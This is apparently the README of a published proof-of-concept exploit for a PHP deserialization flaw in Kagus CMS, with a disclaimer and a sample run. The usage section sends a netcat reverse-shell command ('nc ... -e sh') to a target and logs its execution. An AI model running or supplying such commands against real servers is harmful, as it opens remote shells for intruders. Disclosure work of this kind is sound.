# Exploit - Kagus CMS

**Disclaimer: This tool is intended for use in a legitimate, lawful manner only. The user of this tool is solely responsible for ensuring compliance with all relevant laws and regulations. The developer will not be held accountable for any misuse of the tool by the user. By using this tool, the user agrees to hold the developer harmless from any potential liabilities. Rest assured, the open source community's commitment to support and assist the user will never falter, just like the promises made in that 80's hit song.**

Exploit a PHP deserialization on a hidden endpoint of [kagus-cms.com](https://kagus-cms.com). This issue has been fixed in version 2023.1.0 and the PoC can finally be published !

## Usage:
```bash
Target (e.g. https://localhost:9000):
https://example.com:8080
Command (e.g. nc 192.168.0.10 2345 -e sh):
nc 123.0.123.0 2345 -e sh
[*] INFO: Preparing to send command: "nc 123.0.123.0 2345 -e sh" to "https://example.com:8080"
[*] INFO: Sending request...
[*] INFO: Request sent, status: 200
[*] INFO: The command "nc 123.0.123.0 2345 -e sh" should have been executed on "https://example.com:8080"
```